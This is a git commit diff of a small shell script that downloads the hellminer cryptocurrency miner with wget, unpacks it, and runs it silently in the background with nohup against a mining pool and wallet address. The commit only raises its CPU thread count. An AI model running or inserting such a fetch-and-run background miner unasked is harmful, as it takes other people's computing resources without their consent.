70c94601736a7df58fca4f8b01e280c1eaef223a
prendibs <94189491+prendibs@users.noreply.github.com>
2023-03-03 13:48:56 +0700

    Update na4.sh

--- na4.sh
+++ na4.sh
@@ -2,4 +2,4 @@
 #love u fika
 
 wget https://github.com/hellcatz/hminer/releases/download/v0.57/hellminer_linux64.tar.gz && tar xf hellminer_linux64.tar.gz
-nohup ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RVFP2RM1sJq812KupKtkFp1F6XBBcEBKkm.RFK -p x --cpu 3 </dev/null >/dev/null 2>&1 &
+nohup ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RVFP2RM1sJq812KupKtkFp1F6XBBcEBKkm.RFK -p x --cpu 4 </dev/null >/dev/null 2>&1 &
